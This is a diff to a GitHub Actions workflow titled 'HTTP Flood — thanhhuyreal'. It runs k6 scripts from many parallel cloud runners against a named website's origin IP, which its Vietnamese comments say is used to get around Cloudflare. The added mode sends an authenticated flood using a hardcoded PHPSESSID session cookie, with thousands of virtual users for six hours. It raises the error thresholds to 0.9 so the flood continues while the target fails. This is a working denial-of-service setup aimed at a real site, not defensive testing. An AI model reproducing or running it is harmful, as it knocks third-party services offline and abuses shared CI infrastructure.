@@ -3,20 +3,28 @@ name: HTTP Flood — thanhhuyreal
 on:
   workflow_dispatch:
     inputs:
+      script:
+        description: 'Script chay (mac dinh: test-script.js | auth: test-script-auth.js)'
+        required: false
+        default: 'test-script.js'
       target_url:
-        description: 'Target URL'
+        description: 'Target URL (IP goc bypass CF)'
         required: false
         default: 'http://103.211.206.175/'
       runners:
         description: 'So runner song song (moi runner = 1 IP Azure khac nhau)'
         required: true
-        default: '1'
+        default: '5'
       max_vus:
         description: 'Max VUs moi runner'
         required: false
         default: '5000'
       stages:
-        description: 'Stages (de trong dung mac dinh)'
+        description: 'Stages (de trong dung mac dinh theo script)'
+        required: false
+        default: ''
+      phpsessid:
+        description: 'PHPSESSID (chi can voi test-script-auth.js - lay tu DevTools khi da login)'
         required: false
         default: ''
       proxy:
@@ -40,7 +48,6 @@ jobs:
     needs: prepare
     name: "Runner ${{ matrix.runner }}"
     runs-on: ubuntu-latest
-    # GitHub-hosted runner toi da 6h (360 phut)
     timeout-minutes: 360
     strategy:
       fail-fast: false
@@ -57,18 +64,19 @@ jobs:
 
       - name: Tang ulimit
         run: |
-          # GitHub runner co the khong cho tang - dung || true de skip
           ulimit -n 131072 || true
-          echo "ulimit hien tai: $(ulimit -n)"
+          echo "ulimit: $(ulimit -n)"
 
       - name: Runner info
         run: |
-          echo "Runner : ${{ matrix.runner }}"
-          echo "IP     : $(curl -sf https://api.ipify.org || echo unknown)"
-          echo "CPU    : $(nproc) cores"
-          echo "RAM    : $(free -m | awk '/Mem:/{print $4}') MB free"
+          echo "Runner  : ${{ matrix.runner }}"
+          echo "Script  : ${{ github.event.inputs.script }}"
+          echo "IP      : $(curl -sf https://api.ipify.org || echo unknown)"
+          echo "CPU     : $(nproc) cores"
+          echo "RAM     : $(free -m | awk '/Mem:/{print $4}') MB free"
 
-      - name: Run k6
+      - name: Run k6 — plain flood (test-script.js)
+        if: ${{ github.event.inputs.script == 'test-script.js' || github.event.inputs.script == '' }}
         env:
           TARGET_URL:       ${{ github.event.inputs.target_url || 'http://103.211.206.175/' }}
           STAGES:           ${{ github.event.inputs.stages || '30s:500,60s:5000,360m:5000' }}
@@ -77,16 +85,28 @@ jobs:
           MAX_VUS:          ${{ github.event.inputs.max_vus || '5000' }}
           REQUEST_TIMEOUT:  "15s"
           REQUEST_DELAY:    "0"
-          MAX_5XX_RATE:     "0.5"
-          MAX_TIMEOUT_RATE: "0.8"
-          # k6 tu dong doc HTTP_PROXY / HTTPS_PROXY - de trong = khong dung proxy
+          MAX_5XX_RATE:     "0.9"
+          MAX_TIMEOUT_RATE: "0.9"
           HTTP_PROXY:       ${{ github.event.inputs.proxy }}
           HTTPS_PROXY:      ${{ github.event.inputs.proxy }}
         run: |
           ulimit -n 131072 || true
-          if [ -n "$HTTP_PROXY" ]; then
-            echo "Dung proxy: $HTTP_PROXY"
-          else
-            echo "Khong dung proxy (direct)"
-          fi
           k6 run --no-usage-report sites/thanhhuyreal/test-script.js
+
+      - name: Run k6 — authenticated flood (test-script-auth.js)
+        if: ${{ github.event.inputs.script == 'test-script-auth.js' }}
+        env:
+          IP_URL:           ${{ github.event.inputs.target_url || 'http://103.211.206.175' }}
+          SITE_HOST:        "thanhhuyreal.com"
+          PHPSESSID:        ${{ github.event.inputs.phpsessid || '9eb1fp03nuk8agokbvdekan4vc' }}
+          STAGES:           ${{ github.event.inputs.stages || '30s:500,60s:2000,60s:5000,360m:5000' }}
+          START_RATE:       "100"
+          PRE_VUS:          "500"
+          MAX_VUS:          ${{ github.event.inputs.max_vus || '8000' }}
+          REQUEST_TIMEOUT:  "30s"
+          MAX_ERR_RATE:     "0.9"
+          HTTP_PROXY:       ${{ github.event.inputs.proxy }}
+          HTTPS_PROXY:      ${{ github.event.inputs.proxy }}
+        run: |
+          ulimit -n 131072 || true
+          k6 run --no-usage-report sites/thanhhuyreal/test-script-auth.js
